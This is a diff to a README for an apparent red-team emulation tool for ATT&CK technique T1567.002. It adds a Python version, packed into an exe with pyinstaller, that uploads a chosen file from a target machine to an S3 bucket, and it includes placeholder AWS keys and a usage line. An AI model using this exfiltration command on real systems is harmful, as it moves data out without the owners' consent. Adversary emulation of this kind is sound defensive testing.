@@ -61,3 +61,49 @@ t1567-002 <upload> <file_path> <bucket_name> [region]
 ## Note
 
 Ensure your AWS credentials have appropriate permissions to perform the required S3 operations.
+
+
+
+--- 
+
+## Alternate Python Implementation
+
+In case dotnet is not present on the target environment the python code can be packed into an exe to emulate the TTP.
+
+## Setup
+
+Configure your AWS credentials:
+
+- Replace the following constants in `t1567-002.py` with your values:
+
+  ```python
+  accessKey = "your-access-key"
+  secretKey = "your-secret-key"
+  region = "your-aws-region"
+  ```
+
+## Build
+
+Build:
+```
+# Setup virtual environment
+python.exe -m venv .venv
+source .venv/bin/activate
+
+# Installing dependencies
+python.exe -m pip install pyinstaller boto3
+
+# Packaging the python code file into an executable
+pyinstaller --onefile .\t1567-002.py
+```
+
+Usage 
+
+The application accepts the following command-line arguments:
+
+```
+.\t1567-002.exe <bucketname> <filepath>
+```
+
+- `filepath`: Path to the file
+- `bucketname`: Name of the S3 bucket
